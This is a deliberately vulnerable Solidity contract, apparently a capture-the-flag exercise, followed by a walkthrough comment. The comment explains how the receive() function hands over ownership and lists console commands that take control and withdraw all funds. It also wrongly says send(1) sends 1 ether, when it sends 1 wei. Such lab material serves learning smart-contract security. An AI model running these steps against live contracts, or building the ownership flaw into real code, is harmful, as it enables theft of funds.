*// SPDX-License-Identifier: MIT*

pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

/**Looking at the receive() function we can see that we can become the owner if we send ETHER to the contract without any data, and we must have contributed first.

We type: await contract.contribute({value: 500000000000000})

With this we are sending 0.0005 ETH

Number(await contract.getContribution()) , to check our balance

Then we have to exploit the receive function, for that we do:

await contract.send(1), we send 1 ETHER and the receive function gets triggered. We became the OWNER

Now to withdraw all funds: await contract.withdraw()

await getBalance(contract.address) to check that the balance is 0 */